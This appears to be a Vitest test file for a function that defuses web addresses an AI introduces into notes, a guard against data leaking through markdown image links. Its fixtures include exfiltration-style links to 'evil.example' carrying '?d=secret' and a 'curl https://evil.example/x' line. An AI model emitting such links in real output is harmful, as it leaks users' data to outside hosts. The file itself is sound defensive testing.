import { describe, expect, it } from "vitest";
import { defuseNewAddresses } from "@plainva/ui";

/**
 * Plan KI-Harness P3-6 / ADR 0019 §6: what the AI writes into a note or a
 * comment carries no address the user's own text did not already carry.
 */
describe("addresses in what the AI writes", () => {
  it("makes inert every address the model brought, wherever it stands", () => {
    const out = defuseNewAddresses("See ![x](https://evil.example/p.png?d=secret) and https://evil.example/a and www.evil.example.", []);
    expect(out.text).toBe("See ![x](https[://]evil.example/p.png?d=secret) and https[://]evil.example/a and www[.]evil.example.");
    expect(out.defused).toBe(3);
  });

  it("keeps an address the user's own text carries, character for character", () => {
    const known = ["Docs: https://known.example/guide (see [the page](https://known.example/guide/setup)).", "Shop at www.known.example today."];
    const text = "Read https://known.example/guide, then [setup](https://known.example/guide/setup). Or www.known.example.";
    expect(defuseNewAddresses(text, known)).toEqual({ text, defused: 0 });
  });

  it("does not let the model hang anything onto a known address or a known host", () => {
    const known = ["Docs: https://known.example/guide"];
    const out = defuseNewAddresses("![](https://known.example/guide?d=secret) https://known.example/other https://known.example/guide/more ![](//known.example/x)", known);
    expect(out.text).toBe("![](https[://]known.example/guide?d=secret) https[://]known.example/other https[://]known.example/guide/more ![]([//]known.example/x)");
    expect(out.defused).toBe(4);
    // A sentence mark may follow a known address; a second one makes it another address.
    expect(defuseNewAddresses("See https://known.example/guide.", known).text).toBe("See https://known.example/guide.");
    expect(defuseNewAddresses("![](https://known.example/guide.b)", known).text).toBe("![](https[://]known.example/guide.b)");
    expect(defuseNewAddresses("![](https://known.example/guide.,)", known).text).toBe("![](https[://]known.example/guide.,)");
  });

  it("keeps a known address that stands inside a foreign one from reviving the foreign one", () => {
    const known = ["https://known.example/a"];
    expect(defuseNewAddresses("https://evil.example/?u=https://known.example/a", known).text).toBe("https[://]evil.example/?u=https://known.example/a");
  });

  it("leaves fenced code alone, and trusts nothing when the text carries the marker characters", () => {
    const fenced = "```\ncurl https://evil.example/x\n```\n";
    expect(defuseNewAddresses(fenced, [])).toEqual({ text: fenced, defused: 0 });
    const forged = `${String.fromCharCode(0xe000)}0${String.fromCharCode(0xe001)} https://known.example/a`;
    expect(defuseNewAddresses(forged, ["https://known.example/a"]).text).toContain("https[://]known.example/a");
  });

  it("is stable when run again", () => {
    const known = ["https://known.example/a"];
    const once = defuseNewAddresses("https://known.example/a and https://evil.example/b", known);
    expect(defuseNewAddresses(once.text, known)).toEqual({ text: once.text, defused: 0 });
  });
});
